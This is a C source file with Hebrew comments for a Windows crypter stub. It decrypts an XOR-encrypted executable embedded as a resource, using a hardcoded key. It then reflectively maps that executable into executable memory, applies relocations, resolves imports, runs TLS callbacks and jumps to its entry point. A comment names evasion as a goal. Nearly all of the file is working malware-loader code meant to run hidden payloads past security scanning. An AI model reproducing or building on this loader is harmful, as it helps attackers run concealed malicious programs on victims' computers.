#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include "resource.h"    // ודאי שהקובץ קיים בפרויקט
#include "crypto.h"      // פונקציית ה-XOR מה-Static Library

// --- פונקציות עזר לטעינה רפלקטיבית ---

void ResolveImports(LPVOID targetBase, PIMAGE_NT_HEADERS ntHeaders) {
    PIMAGE_DATA_DIRECTORY importDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (importDir->Size == 0) return;

    PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)((PUINT8)targetBase + importDir->VirtualAddress);
    printf("[*] Starting IAT resolution...\n");

    while (importDesc->Name != 0) {
        char* dllName = (char*)((PUINT8)targetBase + importDesc->Name);
        HMODULE hDll = LoadLibraryA(dllName);
        if (hDll) {
            PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((PUINT8)targetBase + importDesc->FirstThunk);
            PIMAGE_THUNK_DATA originalThunk = (PIMAGE_THUNK_DATA)((PUINT8)targetBase + importDesc->OriginalFirstThunk);

            while (originalThunk->u1.AddressOfData != 0) {
                FARPROC funcAddr = NULL;
                if (IMAGE_SNAP_BY_ORDINAL(originalThunk->u1.Ordinal)) {
                    funcAddr = GetProcAddress(hDll, (LPCSTR)IMAGE_ORDINAL(originalThunk->u1.Ordinal));
                }
                else {
                    PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)((PUINT8)targetBase + originalThunk->u1.AddressOfData);
                    funcAddr = GetProcAddress(hDll, importByName->Name);
                }
                if (funcAddr) thunk->u1.Function = (ULONG_PTR)funcAddr;
                thunk++;
                originalThunk++;
            }
        }
        importDesc++;
    }
    printf("[+] IAT fully resolved.\n");
}

void ExecuteTLSCallbacks(LPVOID targetBase, PIMAGE_NT_HEADERS ntHeaders) {
    PIMAGE_DATA_DIRECTORY tlsDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    if (tlsDir->Size == 0) return;

    PIMAGE_TLS_DIRECTORY tls = (PIMAGE_TLS_DIRECTORY)((PUINT8)targetBase + tlsDir->VirtualAddress);
    PIMAGE_TLS_CALLBACK* callback = (PIMAGE_TLS_CALLBACK*)tls->AddressOfCallBacks;

    if (callback) {
        printf("[*] Executing TLS Callbacks...\n");
        while (*callback) {
            (*callback)(targetBase, DLL_PROCESS_ATTACH, NULL);
            callback++;
        }
    }
}

void ProtectSections(LPVOID targetBase, PIMAGE_NT_HEADERS ntHeaders) {
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    printf("[*] Applying final memory protections...\n");

    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        DWORD oldProtect;
        DWORD protection = PAGE_READONLY;

        if (section[i].Characteristics & IMAGE_SCN_MEM_WRITE) protection = PAGE_READWRITE;
        if (section[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) protection = PAGE_EXECUTE_READ;
        if ((section[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (section[i].Characteristics & IMAGE_SCN_MEM_WRITE)) protection = PAGE_EXECUTE_READWRITE;

        VirtualProtect((LPVOID)((PUINT8)targetBase + section[i].VirtualAddress), section[i].SizeOfRawData, protection, &oldProtect);
    }
}

void MapPEToMemory(unsigned char* payload) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(payload + dosHeader->e_lfanew);

    // 1. הקצאת זיכרון מלאה בגודל שה-Image דורש
    LPVOID targetBase = VirtualAlloc(NULL, ntHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!targetBase) {
        printf("[-] VirtualAlloc failed\n");
        return;
    }

    // 2. העתקת ה-Headers
    memcpy(targetBase, payload, ntHeaders->OptionalHeader.SizeOfHeaders);

    // 3. מיפוי הסקציות (Sections) לכתובות הווירטואליות שלהן
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (section[i].SizeOfRawData > 0) {
            memcpy((PUINT8)targetBase + section[i].VirtualAddress, (PUINT8)payload + section[i].PointerToRawData, section[i].SizeOfRawData);
        }
    }
    printf("[+] Mapping complete!\n");

    // 4. תיקון כתובות (Relocations) - קריטי להרצת EXE גנרי
    ULONG_PTR delta = (ULONG_PTR)targetBase - ntHeaders->OptionalHeader.ImageBase;
    if (delta != 0) {
        PIMAGE_DATA_DIRECTORY relocDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (relocDir->Size > 0) {
            PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)((PUINT8)targetBase + relocDir->VirtualAddress);

            while (reloc->VirtualAddress != 0) {
                DWORD entriesCount = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                PWORD entry = (PWORD)(reloc + 1);

                for (DWORD i = 0; i < entriesCount; i++) {
                    WORD type = entry[i] >> 12;   // סוג התיקון
                    WORD offset = entry[i] & 0xFFF; // המיקום בתוך הבלוק

                    if (type == IMAGE_REL_BASED_DIR64) {
                        PULONG_PTR patchAddr = (PULONG_PTR)((PUINT8)targetBase + reloc->VirtualAddress + offset);
                        *patchAddr += delta;
                    }
                    else if (type == IMAGE_REL_BASED_HIGHLOW) {
                        DWORD* patchAddr = (DWORD*)((PUINT8)targetBase + reloc->VirtualAddress + offset);
                        *patchAddr += (DWORD)delta;
                    }
                }
                reloc = (PIMAGE_BASE_RELOCATION)((PUINT8)reloc + reloc->SizeOfBlock);
            }
            printf("[+] Relocations applied successfully.\n");
        }
    }

    // 5. תיקון ה-IAT (פונקציות ה-API של ווינדוס)
    ResolveImports(targetBase, ntHeaders);

    // 6. הרצת TLS Callbacks (הכרחי לקבצי C++ מורכבים)
    ExecuteTLSCallbacks(targetBase, ntHeaders);

    // 7. הגדרת הרשאות זיכרון סופיות (עבור יציבות וחמקמקות)
    ProtectSections(targetBase, ntHeaders);

    // 8. הקפיצה הגדולה ל-EntryPoint
    printf("[!] JUMPING TO ENTRY POINT: 0x%p\n", (void*)((PUINT8)targetBase + ntHeaders->OptionalHeader.AddressOfEntryPoint));
    printf("--------------------------------------------------\n");

    typedef void (WINAPI* _PayloadEntry)();
    _PayloadEntry pEntry = (_PayloadEntry)((PUINT8)targetBase + ntHeaders->OptionalHeader.AddressOfEntryPoint);

    pEntry();
}
int main() {
    char* key = "mysecretkey";
    printf("[*] Starting Stub execution...\n");

    // איתור וטעינת ה-Resource
    HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
    if (!hRes) return 1;

    HGLOBAL hResData = LoadResource(NULL, hRes);
    unsigned char* pResData = (unsigned char*)LockResource(hResData);
    size_t resSize = SizeofResource(NULL, hRes);

    unsigned char* payload = (unsigned char*)malloc(resSize);
    if (!payload) return 1;
    memcpy(payload, pResData, resSize);

    printf("[*] Decrypting payload with alignment hunter...\n");

    // ניסיון ראשון: פענוח רגיל
    XorCipher(payload, resSize, key, strlen(key));

    if (payload[0] == 'M' && payload[1] == 'Z') {
        printf("[+] Success! MZ found at index 0.\n");
        MapPEToMemory(payload);
    }
    else {
        // ביטול הפענוח הראשון וניסיון עם הסטה של בייט אחד (פיצוי על ה-Resource Compiler)
        XorCipher(payload, resSize, key, strlen(key));

        size_t keyLen = strlen(key);
        for (size_t i = 0; i < resSize - 1; i++) {
            payload[i + 1] ^= key[i % keyLen];
        }

        if (payload[1] == 'M' && payload[2] == 'Z') {
            printf("[!] Success! MZ found at index 1 after alignment fix.\n");
            MapPEToMemory(payload + 1);
        }
        else {
            printf("[-] Critical Error: Could not find MZ signature.\n");
            free(payload);
            return 1;
        }
    }

    free(payload);
    printf("\nPress Enter to exit...");
    (void)getchar();
    return 0;
}